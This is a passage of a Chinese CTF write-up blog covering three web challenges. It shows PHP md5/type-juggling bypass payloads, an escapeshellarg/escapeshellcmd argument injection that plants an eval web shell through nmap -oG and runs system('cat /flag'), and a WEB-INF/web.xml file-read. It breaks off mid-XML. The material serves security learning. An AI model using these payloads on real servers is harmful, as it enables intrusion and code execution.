&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;I&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;put&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;something&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;in&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;F12&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;you&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$flag&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;])&lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $gg&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($id) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($gg) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; $id &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; $gg) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You got the first step&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $passwd&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_numeric&lt;/span&gt;($passwd))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($passwd&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1234567&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Good Job!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;By Retr_0&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;can you think twice??&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You can not get it !&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;only one way to get the flag&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;You are not a real hacker!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Please input first&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#a6e22e"&gt;Please&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;input&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;first&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析一波：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较&lt;code&gt;===&lt;/code&gt;噢。&lt;/li&gt;
&lt;li&gt;第11、17行判断passwd是非数字并且若比较&lt;code&gt;==&lt;/code&gt;等于1234567&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一个利用数组即可绕过&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第二个利用比较时会进行类型转换，字符串&lt;code&gt;1234567a&lt;/code&gt;会被强制转换类型为整型的&lt;code&gt;1234567&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?id[]=1&amp;amp;gg[]=2
POST
passwd=1234567a
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="buuctf-2018online-tool"&gt;[BUUCTF 2018]Online Tool
&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;} &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;glzjin&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;you are in sandbox &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$sandbox;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;mkdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;chdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数&lt;code&gt;escapeshellarg&lt;/code&gt;、&lt;code&gt;escapeshellcmd&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这道题利用了两个点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;nmap可以将扫描的结果存储在文件里。使用方法：&lt;a class="link" href="https://blog.csdn.net/weixin_34221036/article/details/92148628" target="_blank" rel="noopener"
&gt;Nmap扫描结果的保存和输出&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;escapeshellarg+escapeshellcmd同时使用有一些漏洞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener"
&gt;谈谈escapeshellarg参数绕过和注入的问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://paper.seebug.org/164/" target="_blank" rel="noopener"
&gt;PHP escapeshellarg()+escapeshellcmd() 之殇&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参考博客整理一下这两个处理命令的函数同时使用时的问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;假如传入的参数为&lt;code&gt;172.17.0.2' -v -d a=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;首先经过&lt;code&gt;escapeshellarg&lt;/code&gt;函数，这个函数会把单独的单引号&lt;code&gt;'&lt;/code&gt;加上转义符&lt;code&gt;\&lt;/code&gt;并使用单引号&lt;code&gt;'&lt;/code&gt;括起来，再使用单引号&lt;code&gt;'&lt;/code&gt;把整个参数括起来。这时候的参数是&lt;code&gt;'172.17.0.2'\'' -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;再进入&lt;code&gt;escapeshellcmd&lt;/code&gt;函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号&lt;code&gt;'&lt;/code&gt;不过处理，转义符&lt;code&gt;\&lt;/code&gt;再使用转义符转义，再略过一个成对的单引号&lt;code&gt;''&lt;/code&gt;，最后一个单引号&lt;code&gt;'&lt;/code&gt;再使用转义符转义。这时候的参数就成了&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;最后执行的参数是&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;，由于中间的&lt;code&gt;\\&lt;/code&gt;被解释为&lt;code&gt;\&lt;/code&gt;而不再是转义字符，所以后面的&lt;code&gt;'&lt;/code&gt;没有被转义，与再后面的&lt;code&gt;'&lt;/code&gt;配对儿成了一个空白符。所以可以简化为&lt;code&gt; 172.17.0.2\ -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以构造payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经过&lt;code&gt;escapeshellarg&lt;/code&gt;函数会被解析成为：&lt;code&gt;''\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再经过&lt;code&gt;escapeshellcmd&lt;/code&gt;函数会被解析为：&lt;code&gt;''\\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了&lt;code&gt;1.php\&lt;/code&gt;不在是php文件了。所以我们的payload最终在服务器端是：&lt;code&gt;\&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php \ &lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39;&amp;lt;?php eval(&lt;/span&gt;&lt;span style="color:#e6db74"&gt;$_POST[_]&lt;/span&gt;&lt;span style="color:#e6db74"&gt;) ?&amp;gt; -oG 1.php &amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;
&amp;#39;&amp;#39;\&amp;#39;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;\&amp;#39;&amp;#39;&amp;#39;
&amp;#39;&amp;#39;\\&amp;#39;&amp;#39;\&amp;lt;\?php eval\(\) \?\&amp;gt; -oG 1.php &amp;#39;\\&amp;#39;&amp;#39;&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终请求payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?host=&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行指令时会创建一个sandbox文件夹，访问&lt;code&gt;$sandbox$/1.php&lt;/code&gt;，POST传参&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110615.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_=system(&amp;#39;cat /flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110726.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-java"&gt;[RoarCTF 2019]Easy Java
&lt;/h1&gt;&lt;p&gt;是java写的web程序&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;考点是&lt;strong&gt;WEB-INF/web.xml泄露&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WEB-INF主要包含一下文件或目录:&lt;/p&gt;
&lt;p&gt;/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&lt;/p&gt;
&lt;p&gt;/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&lt;/p&gt;
&lt;p&gt;/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&lt;/p&gt;
&lt;p&gt;/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。&lt;/p&gt;
&lt;p&gt;/WEB-INF/database.properties：数据库配置文件&lt;/p&gt;
&lt;p&gt;漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;重点不在登陆界面，而是那个Help按钮，可以下载文件。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110934.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;首先尝试去读web.xml文档，添加POST请求&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;filename=WEB-INF/web.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以读取web.xml文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;web-app&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;xmlns=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xmlns:xsi=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;version=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;4.0&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file&amp;gt;&lt;/span&gt;Index&lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Index&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
